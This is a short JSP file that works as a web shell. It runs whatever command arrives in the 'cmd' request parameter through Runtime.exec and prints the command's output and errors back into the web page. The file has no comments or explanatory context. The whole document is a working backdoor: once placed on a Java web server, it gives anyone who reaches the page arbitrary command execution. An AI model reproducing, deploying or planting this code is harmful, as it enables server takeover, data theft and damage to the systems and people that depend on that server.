<%@ page import="java.io.*" %>
<%
    try {
        String cmd = request.getParameter("cmd");
        Process child = Runtime.getRuntime().exec(cmd);
        BufferedReader in = new BufferedReader(new InputStreamReader(child.getInputStream()));
	 BufferedReader err = new BufferedReader(new InputStreamReader(child.getErrorStream()));
        String c;

        while ((c = in.readLine()) !=null) {
            out.println(c+"\n");
        }
	 while ((c= err.readLine())!=null){
	     out.println(c+"\n");
	}
        in.close();

        try {
            child.waitFor();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    } catch (IOException e) {
        System.err.println(e);
    }
%>
